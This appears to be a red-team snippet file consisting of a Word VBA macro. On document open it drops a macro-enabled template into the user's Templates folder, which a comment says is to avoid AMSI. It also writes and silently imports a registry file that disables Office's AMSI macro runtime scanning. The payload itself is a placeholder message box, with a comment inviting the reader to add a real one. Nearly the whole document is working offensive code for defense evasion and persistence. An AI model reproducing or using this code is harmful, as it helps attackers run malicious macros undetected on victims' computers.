# VBA

```vb
Sub ExecutePayload()
    MsgBox("Pwned!")
End Sub

Sub AutoOpen()
    ' function called by the initial 'dropper' code, drops a dotm into %appdata%\microsoft templates
    curfile = ActiveDocument.Path & "\" & ActiveDocument.Name
    templatefile = Environ("APPDATA") & "\Microsoft\Templates\" & DateDiff("s", #1/1/1970#, Now()) & ".dotm"

    ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdXMLDocumentMacroEnabled, AddToRecentFiles:=True

    ' save back to orig location, otherwise AMSI will kick in (as we are the template)
    ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdXMLDocumentMacroEnabled

    ' now create a new file based on template
    Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0
    
    ' Add your payload here
    ExecutePayload
End Sub

Sub document_open()
    filepath = ActiveDocument.Path & "\"

    ' set contents and save as reg file
    Documents.Add ActiveDocument.Range.Text = _
        "Windows Registry Editor Version 5.00" & vbNewLine & vbNewLine & _
        "[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Common\Security]" & vbNewLine & _
        " ""MacroRuntimeScanScope""=dword:00000000" & vbNewLine & vbNewLine

    ActiveDocument.SaveAs2 FileName:=filepath & "generatedByWord.reg", LineEnding:=wdCRLF, FileFormat:=wdFormatText, Encoding:=437
    ActiveDocument.Close

    ' set contents and save as bat file
    Documents.Add
    ActiveDocument.Range.Text = "regedit.exe /S generatedByWord.reg"

    ActiveDocument.SaveAs2 FileName:=filepath & "generatedByWord.bat", FileFormat:=wdFormatText, Encoding:=437, LineEnding:=wdCRLF
    ActiveDocument.Close
End Sub
```